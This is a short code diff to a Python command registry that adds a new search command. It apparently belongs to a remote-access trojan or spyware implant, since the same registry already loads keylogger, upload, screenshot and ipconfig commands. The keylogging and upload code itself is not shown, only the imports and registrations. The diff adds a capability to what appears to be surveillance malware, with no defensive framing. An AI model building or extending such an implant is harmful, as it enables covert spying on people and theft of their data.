@@ -4,6 +4,7 @@ from .ipconfig import IPConfigCommand
 from .keylogger import KeyloggerCommand
 from .upload import UploadCommand
 from .screenshot import ScreenshotCommand
+from .search import SearchCommand
 
 
 class CommandRegistry:
@@ -16,6 +17,7 @@ class CommandRegistry:
         self.register(KeyloggerCommand())
         self.register(UploadCommand())
         self.register(ScreenshotCommand())
+        self.register(SearchCommand())
 
     def register(self, command):
         self.commands[command.name] = command
